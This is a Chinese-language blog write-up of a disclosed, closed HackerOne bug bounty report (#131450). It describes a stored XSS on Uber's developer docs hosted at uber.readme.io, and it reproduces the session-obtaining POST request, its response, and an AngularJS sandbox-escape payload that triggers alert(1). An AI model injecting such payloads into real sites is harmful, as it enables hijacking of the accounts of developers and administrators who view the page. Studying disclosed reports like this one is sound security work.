# 漏洞散记
##  Uber的Xss第二弹
> 很有趣的XSS三连弹，作者分别在April，June,August提交了三次XSS，且完全利用在同一个地方，然而
就是通过了审查，并分别赚取了$3,000，$7,500，$5,000，简直无情，而且漏洞提交厂商是Uber，但实际影响最大
的却是另一个厂家:**readme.io**


> 漏洞价值:7500$

>源地址:[#131450](https://hackerone.com/reports/131450)

## 漏洞过程

作者没有在**https://developer.uber.com/**过多的执着，也可能是并没有发现新的漏洞，转而去测试了**https://uber.readme.io/**

也就是Uber的开发项目，简单点说就是**developer**页面的管理，并且成功挖掘到漏洞，所以作者本身也不能确定挖掘的漏洞是否
在项目范围之内
```
I'm not entirely sure if this is in scope, but it could definitely have a major impact on developer.uber.com so I figure you'd like to know either way.
```
作者展示了测试流程:
> 这儿猜测，作者本身肯定是对readme.io这个网站的运行流程十分熟悉 ，否则我个人觉得很难会想到这些操作，所以我尝试使用了readme.io,但是发现改了不少

作者访问了**https://uber.readme.io/**，获取到了**connect.sid cookie**

接着构造了一个POST请求
```
POST /users/session HTTP/1.1
Host: uber.readme.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 84
Cookie: YOUR CONNECT.SID COOKIE HERE
Connection: close
Pragma: no-cache
Cache-Control: no-cache

{"email":"readme2@thursday.eml.cc","password":"pjJnBODjkLFv!!11","action":"session"}
```
这儿我就很想问的是，作者为什么能构造得了这个请求？是**readme.io**本身之前就存在一个请求，还是作者完全自己构造出来的？

个人看法:之前**readme**存在这一个提交方式，并且存在一个设计上的权限漏洞,也可能是readme本身提供了API的参照，但是我并没有去找

作者提交了请求后，获得了一个**response**
```
{"id":"57129b7365324b0e002ad83b","name":"James Kettle","email":"readme2@thursday.eml.cc","username":"","provider":"local","createdAt":"2016-04-16T20:07:15.871Z","accessToken":"","stripeId":"","hasStripe":false,"email_verified":false,"hasGithub":false,"github":{},"is_admin":false,"is_god":false}
```
作者从**response**获取到了新的**connect.sid**,将新的cookie填入浏览器，并访问**https://uber.readme.io/docs/deep-linking/edit**，便
以非管理员权限进入到了一个**'Suggest edits' page**，接着根据上一次挖掘到的XSS，在页面中添加如下代码:

```
{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}
```
而造成的结果:

#### When an administrator next views the readme dashboard and clicks on the suggested edit, the injected JavaScript will execute (see screenshot). This JavaScript could automatically approve the suggestion.

#### Congrats, you've now got your own JavaScript executing on https://uber.readme.io/docs/deep-linking - potentially hijacking the account of every developer who views it.

### 结语
对于这一个XSS，我实际更倾向于他是**readme**网站设计上的越权，但是由于能够更改整个网站的JS了，所以才导致的XSS
而在整个漏洞过程中，最最关键的部分，却是在于，那个获取**connect.sid**的操作。大胆的猜测下，作者可能是用了一个没用的**connect.sid**,
提交了在**readme.io**中确实存在却并非Uber的一个用户，获取到了一个低权限只是用来证明用户的**connect.sid**，然后利用这个cookie直接
访问edit，成功到达**'Suggest edits' page**

但是总觉的有所矛盾，如果存在越权的话，那能否直接先登录一个用户，然后尝试访问别人的edit页面呢？这样的水平越权是否能成功呢？

这儿我一直想不通，如果以后遇到类似的场景，一定回来补这个坑

但是由于漏洞已经关闭了，所以并不能验证正确与否，所以只能有机会直接联系作者问一下了
